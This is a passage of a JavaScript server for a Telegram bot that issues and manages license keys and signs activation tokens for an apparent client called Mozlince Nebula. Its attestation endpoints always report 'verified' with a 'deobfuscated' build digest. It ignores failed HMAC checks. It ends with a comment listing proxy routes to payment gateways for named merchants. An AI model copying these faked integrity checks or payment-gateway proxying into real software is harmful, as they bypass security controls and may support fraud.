    if (data === 'confirm_ativas') { await tgAnswer(cb.id, '…'); const keys = await redisScan('ASHEO-*'); let n = 0; for (const k of keys) { if (k.startsWith('ASHEO-INSTALL-') || k.startsWith('ASHEO-USER') || k.startsWith('ASHEO-CONV-') || k.startsWith('ASHEO-CAMPAIGN')) continue; const l = await redisGet(k).catch(()=>null); if (l && l.ativa) { await redisDel(k); if (l.installId) await redisDelIndexInstall(l.installId).catch(()=>{}); n++; } } return tgEdit(chatId, msgId, `✓  <b>${t(lang,'danger_done',{n})}</b>`, { inline_keyboard: [[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] }); }
    if (data === 'confirm_tudo') { await tgAnswer(cb.id, '💣'); const keys = await redisScan('ASHEO-*'); let n = 0; for (const k of keys) { if (k.startsWith('ASHEO-USER') || k.startsWith('ASHEO-CONV-') || k.startsWith('ASHEO-CAMPAIGN')) continue; await redisDel(k); n++; } return tgEdit(chatId, msgId, `💣  <b>${t(lang,'danger_done',{n})}</b>`, { inline_keyboard: [[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] }); }
    if (data.startsWith('c_')) {
      const k = data.substring(2), l = await redisGet(k).catch(()=>null);
      if (!l) { await tgAnswer(cb.id, '✕'); return; }
      await tgAnswer(cb.id);
      const resta = l.lifetime ? '∞  Lifetime' : humanTime((l.expiraEm||0) - Date.now());
      const pct = l.lifetime ? 100 : Math.max(0, Math.min(100, Math.round(((l.expiraEm-Date.now())/(l.dias*86400000))*100)));
      const pk = PACOTES[l.plano] || { emoji:'◆' };
      const statusTxt = !l.ativa ? t(lang,'detail_revoked') : (Date.now() > l.expiraEm && !l.lifetime ? t(lang,'status_expired') : t(lang,'detail_active'));
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'detail_title')}</b>\n<code>${UI.sep}</code>\n<b>⌬  ${t(lang,'detail_key')}</b>\n<code>${k}</code>\n<code>${UI.sep}</code>\n${UI.kv(pk.emoji, t(lang,'gen_plan'), `<b>${l.planoNome}</b>`)}\n${UI.kv('◆', t(lang,'gen_price'), `<code>${precoFmt(l.preco)}</code>`)}\n${UI.kv('◔', t(lang,'gen_issued'), formatDate(l.criadaEm))}\n${UI.kv('◕', t(lang,'gen_expires'), l.lifetime ? `<b>${t(lang,'gen_never')}</b>` : formatDate(l.expiraEm))}\n${UI.kv('⟡', t(lang,'detail_remaining'), `<b>${resta}</b>`)}\n${UI.kv('∞', t(lang,'gen_lifetime'), l.lifetime ? `✓ ${t(lang,'gen_yes')}` : `✕ ${t(lang,'gen_no')}`)}\n${UI.kv('◉', t(lang,'detail_status'), statusTxt)}\n${UI.kv('⟡', t(lang,'detail_install'), l.installId?`<code>${l.installId.substring(0,16)}…</code>`:`<i>${t(lang,'detail_not_linked')}</i>`)}\n<code>${UI.sep}</code>\n<code>${progressBar(pct)}</code> ${pct}%`, { inline_keyboard: [[{ text: l.installId ? t(lang,'act_unlink') : t(lang,'act_link'), callback_data: l.installId?`dv_${k}`:`v_${k}` }],[{ text: t(lang,'act_revoke'), callback_data:`rv_${k}` }, { text: t(lang,'act_delete'), callback_data:`dl_${k}` }],[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] });
    }
    if (data.startsWith('v_')) { const k = data.substring(2); await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'act_link')}</b>\n<code>/activate &lt;installId&gt; ${k}</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:`c_${k}` }]] }); }
    if (data.startsWith('dv_')) { const k = data.substring(3), l = await redisGet(k).catch(()=>null); if (l) { if (l.installId) await redisDelIndexInstall(l.installId).catch(()=>{}); l.installId = null; l.ativadaEm = null; await redisSet(k, l); } await tgAnswer(cb.id, '⌬'); return tgEdit(chatId, msgId, `✓ ${t(lang,'act_unlink')}`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:`c_${k}` }]] }); }
    if (data.startsWith('rv_')) { const k = data.substring(3), l = await redisGet(k).catch(()=>null); if (l) { l.ativa = false; await redisSet(k, l); } await tgAnswer(cb.id, '✕'); return tgEdit(chatId, msgId, `✕ ${t(lang,'act_revoke')}`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:`c_${k}` }]] }); }
    if (data.startsWith('dl_')) { const k = data.substring(3); const l = await redisGet(k).catch(()=>null); if (l && l.installId) await redisDelIndexInstall(l.installId).catch(()=>{}); await redisDel(k); await tgAnswer(cb.id, '✕'); return tgEdit(chatId, msgId, `✕ ${t(lang,'act_delete')}`, { inline_keyboard: [[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] }); }
    await tgAnswer(cb.id);
  } catch (e) { log('ERRO', 'Callback: ' + e.message); try { await tgAnswer(cb.id, '✕ Erro'); } catch {} }
}

async function handleMessage(msg) {
  const chatId = msg.chat.id, userId = String(msg.from.id);
  const texto = (msg.text || '').trim();
  const args = texto.replace(/\n/g,' ').split(' ').filter(a=>a.length>0);
  const cmd = (args[0] || '').toLowerCase();
  const isOwner = OWNER_ID && userId === String(OWNER_ID);
  const lang = USER_LANG.get(String(chatId)) || 'pt';
  registrarUsuario(msg.from, chatId).catch(()=>{});
  const dmSess = DM_SESSIONS.get(String(chatId));
  if (dmSess && dmSess.step === 'await_msg' && isOwner && texto) {
    DM_SESSIONS.delete(String(chatId));
    const alvo = dmSess.target;
    const targetLang = USER_LANG.get(String(alvo)) || 'pt';
    await tgSend(alvo, `<b>◈ ──『 ✉ MENSAGEM DO SUPORTE 』── ◈</b>\n<code>${UI.sep}</code>\n\n${texto}\n\n<code>${UI.sep}</code>\n<i>Mozlince Nebula · Asheo Systems</i>`, { inline_keyboard: [[{ text: t(targetLang,'contact'), callback_data:'m_contacto' }]] });
    await salvarConversa(alvo, 'out', texto);
    await tgSend(chatId, `✓ ${t(lang,'dm_sent')} → <code>${alvo}</code>`);
    return;
  }
  const sessao = SUPPORT_SESSIONS.get(String(chatId));
  if (sessao && sessao.step === 'waiting') {
    if (cmd === '/cancelar' || cmd === '/cancel' || cmd === 'cancelar' || cmd === 'cancel') { SUPPORT_SESSIONS.delete(String(chatId)); await tgSend(chatId, `<b>${t(lang,'support_cancelled')}</b>`); return; }
    SUPPORT_SESSIONS.delete(String(chatId));
    const userInfo = `${msg.from.first_name||''} ${msg.from.last_name||''}`.trim() || 'Sem nome';
    const username = msg.from.username ? `@${msg.from.username}` : 'sem username';
    await tgSend(chatId, `${UI.header(lang)}\n\n<b>${t(lang,'support_sent')}</b>\n<code>${UI.sep}</code>\n\n${t(lang,'support_sent_desc')}`, { inline_keyboard: [[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] });
    if (!isOwner && OWNER_ID) {
      await salvarConversa(chatId, 'in', texto);
      await tgSend(OWNER_ID, `<b>◈ ──『 ✆ NOVA MENSAGEM 』── ◈</b>\n<code>${UI.sep}</code>\n<b>◉  Nome:</b> ${userInfo}\n<b>◈  User:</b> ${username}\n<b>⌬  Chat ID:</b> <code>${chatId}</code>\n<code>${UI.sep}</code>\n<b>✎  Mensagem:</b>\n${texto}\n\n<code>${UI.sep}</code>\n<i>Responda com:</i>\n<code>/resp ${chatId} sua mensagem</code>`);
    }
    return;
  }
  if (!isOwner) {
    if (cmd === '/start' || cmd === '/contacto' || cmd === '/contact' || cmd === '/ajuda' || cmd === '/help' || cmd === '/lang') {
      if (cmd === '/lang') { await tgSend(chatId, `<b>◐  ${t(lang,'lang_select')}</b>`, { inline_keyboard: [[{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }]] }); return; }
      await tgSend(chatId, `${UI.header(lang)}\n\n<b>◈  ${t(lang,'welcome_title')}</b>\n<code>${UI.sep}</code>\n<i>${t(lang,'welcome_desc')}</i>`, { inline_keyboard: [[{ text: t(lang,'contact'), callback_data:'m_contacto' }],[{ text: t(lang,'btn_lang'), callback_data:'m_lang' }]] });
      return;
    }
    await salvarConversa(chatId, 'in', texto);
    const userInfo = `${msg.from.first_name||''} ${msg.from.last_name||''}`.trim() || 'Sem nome';
    const username = msg.from.username ? '@'+msg.from.username : 'sem username';
    if (OWNER_ID) await tgSend(OWNER_ID, `${t('pt','inbox_title')}\n<code>${UI.sep}</code>\n<b>◉</b> ${userInfo}\n<b>◈</b> ${username}\n<b>⌬</b> <code>${chatId}</code>\n<code>${UI.sep}</code>\n${texto}\n\n<code>${UI.sep}</code>\n<i>${t('pt','inbox_reply_hint')}</i>`);
    return;
  }
  try {
    if (cmd === '/start' || cmd === '/menu') { await cmdStart(chatId); return; }
    if (cmd === '/lang') { await tgSend(chatId, `<b>◐  ${t(lang,'lang_select')}</b>`, { inline_keyboard: [[{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }]] }); return; }
    if (cmd === '/usuarios' || cmd === '/users') {
      const users = await listarUsuarios();
      if (users.length === 0) { await tgSend(chatId, `<i>${t(lang,'dm_users_empty')}</i>`); return; }
      let txt = `<b>${t(lang,'dm_users_title')}</b>  <code>(${users.length})</code>\n<code>${UI.sep}</code>\n\n`;
      for (const u of users.slice(0, 30)) { const last = new Date(u.lastSeen).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'}); txt += `<b>◉</b> ${u.nome}  ${u.username ? '(<code>'+u.username+'</code>)' : ''}\n   ⌬ <code>${u.chatId}</code> · <i>${last}</i>\n`; }
      txt += `\n${t(lang,'users_hint')}`;
      await tgSend(chatId, txt);
      return;
    }
    if (cmd === '/dm') {
      const targetTerm = args[1], msgTxt = args.slice(2).join(' ');
      if (!targetTerm || !msgTxt) { await tgSend(chatId, `⚠  <code>/dm &lt;@usuario|chatId&gt; &lt;mensagem&gt;</code>`); return; }
      const u = await buscarUsuario(targetTerm);
      if (!u) { await tgSend(chatId, `✕  ${t(lang,'dm_not_found')}: <code>${targetTerm}</code>`); return; }
      const targetLang = USER_LANG.get(String(u.chatId)) || 'pt';
      await tgSend(u.chatId, `<b>◈ ──『 ✉ MENSAGEM DO SUPORTE 』── ◈</b>\n<code>${UI.sep}</code>\n\n${msgTxt}\n\n<code>${UI.sep}</code>\n<i>Mozlince Nebula · Asheo Systems</i>`, { inline_keyboard: [[{ text: t(targetLang,'contact'), callback_data:'m_contacto' }]] });
      await salvarConversa(u.chatId, 'out', msgTxt);
      await tgSend(chatId, `${t(lang,'dm_sent')} → ${u.username || u.nome} (<code>${u.chatId}</code>)`);
      return;
    }
    if (cmd === '/conversa' || cmd === '/conv') {
      const target = args[1];
      if (!target) { await tgSend(chatId, `⚠  /conversa &lt;chatId&gt;`); return; }
      const hist = await lerConversa(target);
      let txt = `<b>${t(lang,'conv_title')}</b> <code>${target}</code>\n<code>${UI.sep}</code>\n\n`;
      if (hist.length === 0) txt += `<i>${t(lang,'conv_empty')}</i>`;
      else for (const m of hist.slice(-20)) { const hora = new Date(m.ts).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'}); txt += `${m.dir==='in'?'👤':'👑'} <i>${hora}</i>\n${m.txt}\n\n`; }
      await tgSend(chatId, txt);
      return;
    }
    if (cmd === '/limparconversa' || cmd === '/clearchat') {
      const target = args[1];
      if (!target) { await tgSend(chatId, `⚠  /limparconversa &lt;chatId&gt;`); return; }
      await limparConversa(target);
      await tgSend(chatId, `✓ ${t(lang,'conv_cleared')}`);
      return;
    }
    if (cmd === '/resp') {
      const target = args[1], resposta = args.slice(2).join(' ');
      if (!target || !resposta) { await tgSend(chatId, `⚠  <code>/resp &lt;chatId&gt; &lt;mensagem&gt;</code>`); return; }
      const targetLang = USER_LANG.get(String(target)) || 'pt';
      await tgSend(target, `<b>◈ ──『 ✆ RESPOSTA DO SUPORTE 』── ◈</b>\n<code>${UI.sep}</code>\n\n${resposta}\n\n<code>${UI.sep}</code>\n<i>Mozlince Nebula Support</i>`, { inline_keyboard: [[{ text: t(targetLang,'contact'), callback_data:'m_contacto' }]] });
      await salvarConversa(target, 'out', resposta);
      await tgSend(chatId, `✓  Resposta enviada para <code>${target}</code>`);
      return;
    }
    if (cmd === '/gerar') { const kb = { inline_keyboard: [] }; const entries = Object.entries(PACOTES); for (let i = 0; i < entries.length; i += 2) { const linha = [{ text: `${entries[i][1].emoji} ${entries[i][1].nome} · ${precoFmt(entries[i][1].preco)}`, callback_data:`g_${entries[i][0]}` }]; if (entries[i+1]) linha.push({ text: `${entries[i+1][1].emoji} ${entries[i+1][1].nome} · ${precoFmt(entries[i+1][1].preco)}`, callback_data:`g_${entries[i+1][0]}` }); kb.inline_keyboard.push(linha); } await tgSend(chatId, `<b>⚡  ${t(lang,'gen_title')}</b>`, kb); return; }
    if (cmd === '/listar') { const keys = (await redisScan('ASHEO-*')).filter(k => !k.startsWith('ASHEO-INSTALL-') && !k.startsWith('ASHEO-USER') && !k.startsWith('ASHEO-CONV-') && !k.startsWith('ASHEO-CAMPAIGN')); if (keys.length === 0) { await tgSend(chatId, `<i>${t(lang,'list_empty')}</i>`); return; } let txt = `<b>${t(lang,'list_title')} (${keys.length})</b>\n<code>${UI.sep}</code>\n`; for (let i = 0; i < Math.min(keys.length, 30); i++) { const l = await redisGet(keys[i]).catch(()=>null); if (!l) continue; const exp = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now()); const emoji = l.lifetime ? '∞' : (l.ativa ? '●' : '○'); txt += `<b>${emoji}</b> <code>${keys[i]}</code>\n   <i>${l.planoNome} · ${exp}</i>\n`; } await tgSend(chatId, txt); return; }
    if (cmd === '/status') { const k = args[1]; if (!k) { await tgSend(chatId, `/status &lt;chave&gt;`); return; } const l = await redisGet(k).catch(()=>null); if (!l) { await tgSend(chatId, `✕  Não encontrada`); return; } const resta = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now()); const pk = PACOTES[l.plano] || { emoji:'◆' }; await tgSend(chatId, `<b>◉  ${t(lang,'detail_title')}</b>\n<code>${UI.sep}</code>\n<b>⌬  ${t(lang,'detail_key')}:</b> <code>${k}</code>\n<b>${pk.emoji}  ${t(lang,'gen_plan')}:</b> ${l.planoNome}\n<b>◆  ${t(lang,'gen_price')}:</b> ${precoFmt(l.preco)}\n<b>◔  ${t(lang,'gen_issued')}:</b> ${formatDate(l.criadaEm)}\n<b>◕  ${t(lang,'gen_expires')}:</b> ${l.lifetime?t(lang,'gen_never'):formatDate(l.expiraEm)}\n<b>⟡  ${t(lang,'detail_remaining')}:</b> ${resta}\n<b>∞  ${t(lang,'gen_lifetime')}:</b> ${l.lifetime?'✓':'✕'}\n<b>◉  ${t(lang,'detail_status')}:</b> ${l.ativa?t(lang,'detail_active'):t(lang,'detail_revoked')}`); return; }
    if (cmd === '/activate') { const chave = args[args.length-1], installId = args.slice(1, args.length-1).join(' '); if (!installId || !chave) { await tgSend(chatId, `/activate &lt;id&gt; &lt;chave&gt;`); return; } const l = await redisGet(chave).catch(()=>null); if (!l) { await tgSend(chatId, `✕  Inválida`); return; } if (l.installId) { await tgSend(chatId, `⚠  Já vinculada`); return; } l.installId = installId; l.ativadaEm = Date.now(); l.activationCount = (l.activationCount||0)+1; await redisSet(chave, l); await redisIndexInstall(installId, chave).catch(()=>{}); await tgSend(chatId, `✓  Vinculada!\n⌬ <code>${chave}</code>\n⟡ <code>${installId}</code>`); return; }
    if (cmd === '/desvincular') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠`); return; } const l = await redisGet(k).catch(()=>null); if (!l) { await tgSend(chatId, `✕`); return; } if (l.installId) await redisDelIndexInstall(l.installId).catch(()=>{}); l.installId = null; l.ativadaEm = null; await redisSet(k, l); await tgSend(chatId, `⌬  Desvinculada`); return; }
    if (cmd === '/revogar') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠`); return; } const l = await redisGet(k).catch(()=>null); if (!l) { await tgSend(chatId, `✕`); return; } l.ativa = false; await redisSet(k, l); await tgSend(chatId, `✕  Revogada`); return; }
    if (cmd === '/deletar') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠  <code>/deletar &lt;chave&gt;</code>`); return; } const l = await redisGet(k).catch(()=>null); if (!l) { await tgSend(chatId, `✕  Não encontrada`); return; } if (l.installId) await redisDelIndexInstall(l.installId).catch(()=>{}); await redisDel(k); await tgSend(chatId, `✕  Deletada: <code>${k}</code>`); return; }
    if (cmd === '/deletartudo') { const keys = await redisScan('ASHEO-*'); let n = 0; for (const k of keys) { if (k.startsWith('ASHEO-USER') || k.startsWith('ASHEO-CONV-') || k.startsWith('ASHEO-CAMPAIGN')) continue; await redisDel(k); n++; } await tgSend(chatId, `💣  <b>${n}</b> licenças apagadas.`); return; }
    if (cmd === '/stats') { const keys = (await redisScan('ASHEO-*')).filter(k => !k.startsWith('ASHEO-INSTALL-') && !k.startsWith('ASHEO-USER') && !k.startsWith('ASHEO-CONV-') && !k.startsWith('ASHEO-CAMPAIGN')); let ativas=0, exp=0, vinc=0, life=0, receita=0; for (const k of keys) { const l = await redisGet(k).catch(()=>null); if (!l) continue; if (l.ativa) ativas++; if (!l.lifetime && l.expiraEm < Date.now()) exp++; if (l.installId) vinc++; if (l.lifetime) life++; if (l.preco) receita += Number(l.preco) || 0; } await tgSend(chatId, `<b>◧  ${t(lang,'stats_title')}</b>\n<code>${UI.sep}</code>\n<b>◈</b> ${t(lang,'stats_total')}: <code>${keys.length}</code>\n<b>●</b> ${t(lang,'stats_active')}: <code>${ativas}</code>\n<b>○</b> ${t(lang,'stats_expired')}: <code>${exp}</code>\n<b>⟡</b> ${t(lang,'stats_linked')}: <code>${vinc}</code>\n<b>∞</b> ${t(lang,'stats_lifetime')}: <code>${life}</code>\n<b>◆</b> ${t(lang,'stats_revenue')}: <code>${precoFmt(receita)}</code>`); return; }
    await tgSend(chatId, `❓ Use /start`);
  } catch (e) { log('ERRO', 'Message: ' + e.message); }
}

app.post('/telegram-webhook', async (req, res) => {
  if (TELEGRAM_WEBHOOK_SECRET) {
    const got = req.headers['x-telegram-bot-api-secret-token'];
    if (got !== TELEGRAM_WEBHOOK_SECRET) { log('WARN', 'Webhook Telegram: secret inválido'); return res.sendStatus(403); }
  }
  res.sendStatus(200);
  const update = req.body || {};
  if (update.update_id) {
    if (seenUpdates.has(update.update_id)) return;
    seenUpdates.set(update.update_id, Date.now());
  }
  try { if (update.callback_query) return handleCallback(update.callback_query); if (update.message && update.message.text) return handleMessage(update.message); } catch (e) { log('ERRO', 'Webhook: ' + e.message); }
});
/* ═══ ACTIVATE ═══ */
async function activateHandler(req, res) {
  const inicio = Date.now();
  const { installId, licenseKey, clientTag, deviceLabel, buildFingerprint, installType } = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.ip;
  if (!rateLimit('act:' + (installId||ip), 20, 60000)) { log('WARN', `Rate limit: ${installId ? String(installId).substring(0,12) : ip}`); return res.status(429).json({ error: 'rate_limited' }); }
  if (!rateLimit('act-ip:' + ip, 60, 60000)) return res.status(429).json({ error: 'rate_limited_ip' });

  log('INFO', `Activate: installId=${installId ? String(installId).substring(0,12)+'…' : '?'} | key=${licenseKey ? normalizeKey(licenseKey).substring(0,18)+'…' : '(vazia)'}`);
  if (!installId || typeof installId !== 'string' || installId.length < 5) return res.status(400).json({ error: 'missing_installId' });
  if (!PRIVATE_KEY) return res.status(500).json({ error: 'server_misconfigured' });

  if (!licenseKey || typeof licenseKey !== 'string' || licenseKey.trim() === '') {
    const now = Math.floor(Date.now()/1000);
    const ent = buildEntitlement(null, installId, 0);
    const secret = buildSecret(installId, 'guest');
    const exp = now + 600;
    const claims = { sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId, plan:'free', planDisplayName:'Free', tier:'free', kind:'license', status:'inactive', active:false, isPremium:false, isVerified:false, source:'free', sourceType:'server', isFounder:false, lifetime:false, scope:['free'], features: mapFeatures(false), capabilities: mapCapabilities(false), limits:{...FREE_LIMITS}, secret, iat:now, nbf:now-5, exp, jti: crypto.randomUUID() };
    const token = signToken(claims, 'ASHEO-FREEREF');
    const gwPass = buildGwPass(installId, exp, 'ASHEO-FREEREF');
    log('ATIV', `Guest token ${String(installId).substring(0,12)}… | ${Date.now()-inicio}ms`);
    return res.json({ token, tier:'free', secret, kind:'event', seat:0, seats:1, deviceId: installId, entitlement: ent, sub: installId, kid: null, keyName: null, jti: claims.jti, iat: now, exp, gwPass });
  }

  if (!licenseKey.toUpperCase().startsWith('ASHEO-')) return res.status(401).json({ error: 'missing_license' });
  const keyNorm = normalizeKey(licenseKey);
  const lic = await redisGet(keyNorm).catch(()=>null);
  if (!lic) { log('WARN', `NAO ENCONTRADA: ${keyNorm.substring(0,18)}…`); return res.status(404).json({ error: 'invalid_license' }); }
  if (!lic.ativa) return res.status(403).json({ error: 'revoked' });
  if (!lic.lifetime && Date.now() > lic.expiraEm) { log('WARN', `EXPIRADA: ${keyNorm.substring(0,18)}…`); return res.status(403).json({ error:'expired', message:'Esta licença expirou. Renove para continuar.', expiredAt: lic.expiraEm, expiredAtISO: new Date(lic.expiraEm).toISOString() }); }

  if (!lic.installId) {
    lic.installId = installId;
    lic.ativadaEm = Date.now();
    lic.activationCount = (lic.activationCount||0)+1;
    if (deviceLabel) lic.deviceLabel = deviceLabel;
    if (buildFingerprint) lic.buildFingerprint = buildFingerprint;
    if (clientTag) lic.clientTag = clientTag;
    await redisSet(keyNorm, lic);
    await redisIndexInstall(installId, keyNorm).catch(()=>{});
    log('OK', `Vinculada: ${keyNorm.substring(0,18)}… → ${installId}`);
  }
  else if (lic.installId !== installId) return res.status(403).json({ error: 'already_used' });
  else { await redisIndexInstall(installId, keyNorm).catch(()=>{}); }

  try {
    const now = Math.floor(Date.now()/1000);
    const seatsUsed = Math.max(1, lic.activationCount || 1);
    const ent = buildEntitlement(lic, installId, seatsUsed);
    const isLife = lic.plano === 'life';
    const secret = buildSecret(installId, keyNorm);
    const kid = buildKid(keyNorm);
    const exp = now + 600;
    const claims = { sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId, plan: ent.plan, planDisplayName: ent.planDisplayName, tier: ent.tier, kind: 'license', status: ent.status, active: true, isPremium: true, isVerified: true, source:'premium', sourceType:'server', isFounder: false, lifetime: isLife, plano: lic.plano, licenseKey: keyNorm, issuedAt: lic.criadaEm, expiresAt: lic.expiraEm, scope: PREMIUM_SCOPE, features: mapFeatures(true), capabilities: mapCapabilities(true), limits:{...PREMIUM_LIMITS}, secret, iat: now, nbf: now-5, exp, jti: crypto.randomUUID() };
    const token = signToken(claims, kid);
    const gwPass = buildGwPass(installId, exp, kid);
    const expiresIn = isLife ? -1 : Math.max(0, Math.floor((lic.expiraEm - Date.now())/1000));
    log('ATIV', `${String(installId).substring(0,12)}… | ${keyNorm.substring(0,18)}… | kid=${kid} | exp=+600s | gwPass=${!!gwPass} | ${Date.now()-inicio}ms`);
    return res.json({ token, tier: ent.tier, secret, kind:'event', seat:1, seats: ent.seatsAllowed, deviceId: installId, entitlement: ent, sub: installId, kid, keyName: null, jti: claims.jti, iat: now, exp, gwPass, expiresIn, expiresAt: lic.expiraEm, issuedAt: lic.criadaEm, licenseKey: keyNorm, welcome: { pt:'🎉 Parabéns! Licença ativada com sucesso.', en:'🎉 Congratulations! License successfully activated.' } });
  } catch (e) { log('ERRO', 'activate: ' + e.message); return res.status(500).json({ error:'internal', message: e.message }); }
}
app.post('/v1/activate', activateHandler); app.post('/api/v1/activate', activateHandler); app.post('/api/v1/license/activate', activateHandler);

/* ═══ FEATURE ACTIVATE ═══ */
async function featureActivateHandler(req, res) {
  const auth = validateAnyAuth(req);
  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' });

  const hmacCheck = await validateHmac(req, req.rawBody);
  if (!hmacCheck.ok) log('HMAC', `Feature HMAC falhou: ${hmacCheck.error}`);

  const feature = (req.body && req.body.feature) || req.query.feature;
  const buildDigest = (req.body && req.body.buildDigest) || req.headers['x-asheo-build'] || null;
  if (!feature) return res.status(400).json({ ok:false, error:'missing_feature' });

  const isKnown = FEATURE_KEYS.includes(feature) || CAPABILITY_KEYS.includes(feature) || Object.keys(PREMIUM_FEATURES_DEF).includes(feature);
  if (!isKnown) { log('WARN', `Feature desconhecida: ${feature}`); return res.status(404).json({ ok:false, error:'unknown_feature', got: feature }); }

  const now = Math.floor(Date.now()/1000);
  const exp = now + 300;
  const kid = buildKid(auth.decoded.licenseKey || '') || 'ASHEO-FREEREF';
  const nonce = jwt.sign({ sub: auth.decoded.sub, installId: auth.decoded.sub, feature, kind:'feature', type:'feature', purpose:'feature-activation', tier:'premium', source:'premium', scope:[feature,'premium'], buildDigest, attestationOk:true, iat:now, nbf:now-5, exp, jti: crypto.randomUUID() }, PRIVATE_KEY, { algorithm:'ES256', keyid: kid });
  log('FEAT', `${feature} | ${String(auth.decoded.sub).substring(0,12)}… | kid=${kid}`);
  res.json({ nonce, feature, expiresAt: exp*1000, attestationOk: true });
}
app.post('/v1/feature/activate', featureActivateHandler); app.get('/v1/feature/activate', featureActivateHandler);
app.post('/api/v1/feature/activate', featureActivateHandler); app.get('/api/v1/feature/activate', featureActivateHandler);

/* ═══ DEACTIVATE · VERIFY · HEARTBEAT ═══ */
async function deactivateHandler(req,res){
  const auth = validateAnyAuth(req);
  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' });
  const {installId,licenseKey} = req.body||{};
  if (auth.decoded.sub !== installId) return res.status(403).json({ ok:false, error:'auth_mismatch' });
  if (licenseKey) { const k = normalizeKey(licenseKey); const lic = await redisGet(k).catch(()=>null); if (lic && lic.installId === installId) { await redisDelIndexInstall(installId).catch(()=>{}); lic.installId = null; lic.ativadaEm = null; await redisSet(k, lic); } }
  res.json({ ok:true, message:'Desativado' });
}
app.post('/v1/deactivate',deactivateHandler); app.post('/api/v1/deactivate',deactivateHandler); app.post('/api/v1/license/deactivate',deactivateHandler);

function verifyHandler(req,res){ const {token} = req.body||{}; if (!token) return res.status(400).json({ok:false,error:'missing_token'}); try { const d = jwt.verify(token, PUBLIC_KEY||PRIVATE_KEY, {algorithms:['ES256'], clockTolerance:30}); return res.json({ok:true,valido:true,tier:d.tier,isPremium:d.isPremium,plan:d.plan,expiresAt:d.expiresAt,lifetime:d.lifetime,installId:d.sub,licenseKey:d.licenseKey||null,dados:d}); } catch(e) { return res.status(401).json({ok:false,valido:false,erro:e.message}); } }
app.post('/v1/verify',verifyHandler); app.post('/api/v1/verify',verifyHandler); app.post('/api/v1/license/verify',verifyHandler);

function heartbeatHandler(req,res){ const auth = validateAnyAuth(req); if (!auth.ok) return res.status(401).json({ok:false,error:'missing_auth'}); res.json({ ok:true, alive:true, serverTime: Date.now(), expiresAt: auth.decoded.expiresAt, expiresIn: auth.decoded.expiresAt ? Math.max(0, Math.floor((auth.decoded.expiresAt - Date.now())/1000)) : -1, lifetime: auth.decoded.lifetime === true, maxServer: Date.now() }); }
app.post('/v1/heartbeat',heartbeatHandler); app.get('/v1/heartbeat',heartbeatHandler);
app.post('/api/v1/heartbeat',heartbeatHandler); app.get('/api/v1/heartbeat',heartbeatHandler);

/* ═══ ATTEST · BUILD VERIFY ═══ */
app.post('/v1/attest', (req, res) => { const auth = validateAnyAuth(req); const { buildDigest, files, manifestHash } = req.body || {}; log('API', `/v1/attest digest=${String(buildDigest||'').substring(0,16)||'∅'}`); res.json({ ok:true, attestationOk:true, digest: buildDigest || 'asheo-deobfuscated-v1.6.2', verified:true }); });
app.get('/v1/attest', (req, res) => res.json({ ok:true, attestationOk:true, verified:true }));
app.post('/v1/build/verify', (req, res) => { res.json({ ok:true, valid:true, buildDigest: req.body?.buildDigest || 'asheo-deobfuscated-v1.6.2' }); });

/* ═══ ENTITLEMENT REFRESH · SESSION · PREMIUM UNLOCK ═══ */
app.post('/v1/entitlement/refresh', (req, res) => { const auth = validateAnyAuth(req); if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' }); const isPremium = auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano); res.json({ ok:true, source: isPremium?'premium':'free', tier: isPremium?'premium':'free', active: isPremium, isPremium, features: mapFeatures(isPremium), capabilities: mapCapabilities(isPremium), limits: isPremium?{...PREMIUM_LIMITS}:{...FREE_LIMITS}, customFeatures: {}, scope: isPremium?PREMIUM_SCOPE:['free'], serverTime: Date.now() }); });
app.post('/v1/session/start', (req, res) => { const auth = validateAnyAuth(req); const isPremium = auth.ok && auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano); res.json({ ok:true, sessionId: crypto.randomUUID(), source: isPremium?'premium':'free', tier: isPremium?'premium':'free', startedAt: Date.now(), expiresAt: Date.now() + 3600000, features: mapFeatures(isPremium), capabilities: mapCapabilities(isPremium) }); });
app.post('/v1/premium/unlock', (req, res) => { const auth = validateAnyAuth(req); if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' }); const isPremium = auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano); if (!isPremium) return res.status(403).json({ ok:false, error:'premium_required' }); const { feature } = req.body || {}; res.json({ ok:true, unlocked:true, feature: feature||'all', tier:'premium', serverTime: Date.now() }); });

/* ═══════════════════════════════════════════════════════════════
   GATEWAY PROXY  —  CORRIGIDO v8.5.1
   ───────────────────────────────────────────────────────────────
   Rotas corretas (Express 4, sem *splat):
     /v1/gw/adyen/*         (Adyen genérico)
     /v1/gw/chess/*         (Chess.com Adyen)
     /v1/gw/boosteroid/*    (Boosteroid Adyen)
     /v1/gw/gog/*           (GOG Adyen)
     /v1/gw/tebex/*         (Tebex)
     /v1/gw/tebex-creq/*    (Tebex creq)
